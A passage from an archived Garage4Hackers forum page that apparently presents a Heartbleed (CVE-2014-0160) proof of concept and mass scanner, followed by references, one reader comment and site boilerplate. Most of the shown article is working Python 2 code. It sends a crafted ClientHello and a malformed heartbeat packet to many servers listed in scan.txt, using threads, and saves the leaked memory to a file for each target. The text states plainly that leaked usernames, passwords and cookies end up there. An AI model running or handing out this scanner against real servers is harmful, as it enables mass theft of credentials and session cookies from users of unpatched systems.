+    00 # ClientHello field: compression support, no compression (0)
+    00 00 # ClientHello field: extension length (0)
+
+'''
+
+
+
+hello_packet = &quot;16030200310100002d0302500bafbbb75ab83ef0ab9ae3f39c6315334137acfd6c181a2460dc4967c2fd960000040033c01101000000&quot;.decode('hex')
+hb_packet = &quot;1803020003014000&quot;.decode('hex')
+
+def password_parse(the_response):
+    the_response_nl= the_response.split(' ')
+    #Interesting Paramaters found:
+    for each_item in the_response_nl:
+        if &quot;=&quot; in each_item or &quot;password&quot; in each_item:
+            print each_item
+
+
+def recv_timeout(the_socket,timeout=2):
+    #make socket non blocking
+    the_socket.setblocking(0)
+
+    #total data partwise in an array
+    total_data=[];
+    data='';
+
+    #beginning time
+    begin=time.time()
+    while 1:
+        if total_data and time.time()-begin &gt; timeout:
+            break
+
+        elif time.time()-begin &gt; timeout*2:
+            break
+
+        try:
+            data = the_socket.recv(8192)
+            if data:
+                total_data.append(data)
+                #change the beginning time for measurement
+                begin=time.time()
+            else:
+                #sleep for sometime to indicate a gap
+                time.sleep(0.1)
+        except:
+            pass
+
+    return ''.join(total_data)
+
+
+def tls(target_addr):
+
+    try:
+
+        server_port =443
+        target_addr = target_addr.strip()
+
+        if &quot;:&quot; in target_addr:
+            server_port = target_addr.split(&quot;:&quot;)[1]
+            target_addr = target_addr.split(&quot;:&quot;)[0]
+
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sys.stdout.flush()
+        print &gt;&gt;sys.stderr, '\n[+]Scanning  server %s' % target_addr , &quot;\n&quot;
+        print &quot;##############################################################&quot;
+        sys.stdout.flush()
+        client_socket .connect((target_addr, int(server_port)))
+        #'Sending Hello request...'
+        client_socket.send(hello_packet)
+        recv_timeout(client_socket,3)
+        print 'Sending heartbeat request...'
+        client_socket.send(hb_packet)
+        data = recv_timeout(client_socket,3)
+        if len(data) &gt; 7 :
+            print &quot;[-] &quot;,target_addr,' Vulnerable Server ...\n'
+            #print data
+            if os.path.exists(target_addr+&quot;.txt&quot;):
+                file_write = open(target_addr+&quot;.txt&quot;, 'a+')
+            else:
+                file_write = file(target_addr+&quot;.txt&quot;, &quot;w&quot;)
+            file_write.write(data)
+        else :
+            print &quot;[-] &quot;,target_addr,' Not Vulnerable  ...'
+    except Exception as e:
+        print e,target_addr,server_port
+
+
+
+class BinaryGrab(threading.Thread):
+    &quot;&quot;&quot;Threaded Url Grab&quot;&quot;&quot;
+    def __init__(self, queue):
+        threading.Thread.__init__(self)
+        self.queue = queue
+
+    def run(self):
+        while True:
+            url = self.queue.get()
+            tls(url)
+            #Scan targets here
+
+            #signals to queue job is done
+            self.queue.task_done()
+
+
+
+start = time.time()
+
+def manyurls(server_addr):
+    querange = len(server_addr)
+    queue = Queue.Queue()
+
+    #spawn a pool of threads, and pass them queue instance
+    for i in range(int(querange)):
+        t = BinaryGrab(queue)
+        t.setDaemon(True)
+        t.start()
+
+    #populate queue with data
+    for target in server_addr:
+
+        queue.put(target)
+
+    #wait on the queue until everything has been processed
+    queue.join()
+if __name__ == &quot;__main__&quot;:
+    # Kepp all ur targets in scan.txt in the same folder.
+    server_addr = []
+    read_f = open(&quot;scan.txt&quot;, &quot;r&quot;)
+    server_addr = read_f.readlines()
+    #or provide names here
+    #server_addr = ['yahoo.com']
+    manyurls(server_addr)</pre>
+</div><br />
+<br />
+<br />
+Leaked UserName password Cookie files would be  stored in the local folder with target name.<br />
+<br />
+<img src="attachmentbd0a.jpg?attachmentid=681&amp;d=1397060917" border="0" alt=""  style="float: CONFIG" /><br />
+<br />
+<br />
+Regards.<br />
+<br />
+<img src="attachmenta405.png?attachmentid=679&amp;d=1397060917" border="0" alt=""  style="float: CONFIG" /><br />
+Reference:<br />
+<br />
+<a href="../external.html?link=http://blog.bjrn.se/2012/07/fun-with-tls-handshake.html" target="_blank">http://blog.bjrn.se/2012/07/fun-with-tls-handshake.html</a><br />
+<a href="../external.html?link=https://github.com/openssl/openssl/commit/96db9023b881d7cd9f379b0c154650d6c108e9a3#diff-2" target="_blank">https://github.com/openssl/openssl/c...108e9a3#diff-2</a><br />
+<a href="../external.html?link=https://bitbucket.org/fb1h2s/cve-2014-0160/src/2b1fff1a62e29397ff60586557c96989c7b64662/Heartbeat_scanner.py?at=master" target="_blank">https://bitbucket.org/fb1h2s/cve-201...r.py?at=master</a></div>
+
+	
+
+	
+		<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
+		<script type="text/javascript">
+		<!--
+		vBulletin.register_control("vB_Lightbox_Container", "article_content", 1);
+		//-->
+		</script>
+	
+
+	
+
+	
+		<sub class="article_promoted_text">
+			This article was originally published in blog:
+			<a href="bloge81f.html?u=8">CVE-2014-0160 Heartbleed Attack POC and Mass Scanner .</a>
+			started by
+			<a href="membere81f.html?u=8">fb1h2s</a>
+		</sub>
+	
+	<div class="cmslinks">
+
+		
+	
+	</div>
+
+    
+	<script type="text/javascript">
+	var THREADID = 5994;
+	var THIS_URL = "content3174.html?r=168-CVE-2014-0160-Heartbleed-Attack-POC-and-Mass-Scanner";
+	var MIN_CHARS = 30;
+	vbphrase['comment'] = "Comment";
+	vbphrase['comments'] = "Comments";
+</script>
+<div id="comments" class="cms_comments_page">
+	<a name="comments_start"></a>
+	<div id="node_comments_block">
+	<input type="hidden" value="1" id="allow_ajax_qr" />
+	<div id="comments_comment_count" class="comments_comment_count">
+		<img src="images/misc/comment.html" alt="Comments" border="0" /><span id="comments_block_count"> 1</span> <span id="comments_block_text">Comment</span>
+	</div>
+	<div id="node_comments" class="cms_none_comments">
+		<div id="comments_14478" class="cms_comments_mainbox postcontainer">
+	<ol>
+<li class="postbit postbit-lite" id="post_14478">
+<div class="postbit_pb_left">
+<a name="comment_14478"></a>
+	
+		
+			<a href="memberc1db.html?u=25436" class="avatarlink"><img src="images/misc/unknown.html" width="60" height="60" alt="malindo's Avatar" border="0" /></a>
+		
+	
+	</div>
+	<div class="postbit_pb_right">
+	<div class="comment_blockrow postbit_headers postbit_borders">
+		<div class="floatleft">
+			
+				<a href="memberc1db.html?u=25436" class="username">malindo</a>
+			
+			 - <span class="postdate">12-29-2015, <span class="time">06:27 AM</span></span>
+		</div>
+	
+	<div class="floatright">
+		<ul class="postcontrols">
+				
+				
+				
+				
+					<li>
+						<a href="newreplyc198.html?do=newreply&amp;p=14478&amp;return_node=168" class="reply" rel="nofollow"><img src="images/buttons/reply_40b.html" alt="" class="inlineimg" /> Reply</a>
+					</li>
+				
+				
+				
+				
+		</ul>
+	</div>
+	</div>
+	<div id="post_message_14478" class="comment_text">
+		<blockquote class="posttext restore restore_margin">
+			hmmm thats right.. thanks for shared
+		</blockquote>
+	</div>
+</div> 
+
+</li></ol>
+	<div id="respond_14478"></div>
+</div>
+	</div>
+	<div id="pagenav" class="comments_page_nav_css fullwidth">
+		
+	</div>
+        <script type="text/javascript">
+	<!--
+		var ajax_last_post = '1451350638';
+		vB_XHTML_Ready.subscribe(function (e) {vB_AJAX_QuickEdit_Init('node_comments');})
+	//-->
+        </script>
+	<div id="ajax_post_errors" class="hidden">
+		<div class="block">
+			<div class="blockhead floatcontainer">
+				<span class="blockhead_info"><input type="button" class="button" value=" X " id="quick_edit_errors_hide" tabindex="50" /></span>
+				<h2>vBulletin Message</h2>
+			</div>
+			<div class="blockbody">
+				<div id="ajax_post_errors_message" class="blockrow">&nbsp;</div>
+			</div>
+			<div class="blockfoot">
+				<a href="#" id="quick_edit_errors_cancel" class="textcontrol">Cancel Changes</a>
+			</div>
+		</div>
+	</div>
+</div>
+	<script type="text/javascript" src="clientscript/vbulletin-editor6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_quick_edit6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
+	<div id="node_comments_hide"></div>
+	<!-- EDITOR IS BREAKING THE PAGE -->
+	
+</div>
+
+
+</div></li>
+</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="yui-b yui-sidebar">
+			<ul class="list_no_decoration widget_list" id="widgetlist_column3">
+<li><div class="cms_widget">
+	<div class="block">
+		<div class="cms_widget_header">
+		<h3><img src="images/site_icons/html.html" alt="" /> G4H Facebook</h3>
+		</div>
+		<div class="cms_widget_content widget_content">
+		<div class="fb-like-box" data-href="https://www.facebook.com/pages/Garage4Hackers/138904662794635" data-width="300" data-height="250" data-colorscheme="light" data-show-faces="true" data-header="true" data-stream="false" data-show-border="true"></div>
+		</div>
+	</div>
+</div></li><li><div class="cms_widget">
+	<div class="block">
+		<div class="cms_widget_header">
+		<h3><img src="images/site_icons/html.html" alt="" /> G4H Twitter</h3>
+		</div>
+		<div class="cms_widget_content widget_content">
+		<a class="twitter-timeline"  href="../external.html?link=https://twitter.com/garage4hackers"  data-widget-id="387207513831010305">Tweets by @garage4hackers</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+		</div>
+	</div>
+</div></li>
+</ul>
+		</div>
+	</div>
+</div>
+
+</div>
+
+<div style="clear: left">
+  
+<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 468;
+google_ad_height = 60;
+google_ad_format = "468x60_as";
+google_ad_type = "text_image";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+  <div id="ad_global_above_footer"><div align="center">
+<script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/9/10 */
+google_ad_slot = "7101394260";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+</div>
+
+<div id="footer" class="floatcontainer footer">
+
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+
+		
+			<select name="styleid" onchange="switch_id(this, 'style')">
+				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
+				
+					
+					<optgroup label="&nbsp;Standard Styles">
+									
+					
+	<option value="1" class="" selected="selected">-- Default Style</option>
+
+					
+					</optgroup>
+										
+				
+				
+					
+					<optgroup label="&nbsp;Mobile Styles">
+					
+					
+	<option value="2" class="" >-- Default Mobile Style</option>
+
+					
+					</optgroup>
+										
+				
+			</select>	
+		
+		
+		
+	</form>
+
+	<ul id="footer_links" class="footer_links">
+		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+		<li><a href="index.html">Garage4hackers</a></li>
+		
+		
+		<li><a href="archive/index.html">Archive</a></li>
+		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		
+		
+		<li><a href="content3174.html?r=168-CVE-2014-0160-Heartbleed-Attack-POC-and-Mass-Scanner#top" onclick="document.location.hash='top'; return false;">Top</a></li>
+	</ul>
+	
+	
+	
+	
+	<script type="text/javascript">
+	<!--
+		// Main vBulletin Javascript Initialization
+		vBulletin_init();
+		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
+	//-->
+	</script>
+        
+</div>
+</div> <!-- closing div for body_wrapper -->
+
+<div class="below_body">
+<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">03:51 PM</span>.</div>
+
+<div id="footer_copyright" class="shade footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="shade footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	<img src="cronec38.gif?rand=1584872461" alt="" width="1" height="1" border="0" />
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+	
+</div>
+ 
+
+	<div id="fb-root"></div>
+<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+
+<script type="text/javascript">
+<!--
+	loadFacebookAPI('en_US');
+	function fbAsyncInit()
+	{
+		vBfb = new vB_Facebook({
+			appid : "170793809601191",
+			connected : 0,
+			active : 0,
+			autoreg : 0,
+			feed_newthread : 1,
+			feed_postreply : 1,
+			feed_blogentry : 1,
+			feed_blogcomment : 1,
+			feed_newarticle : 1,
+			feed_articlecomment : 1
+		});
+	}
+// -->
+</script>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
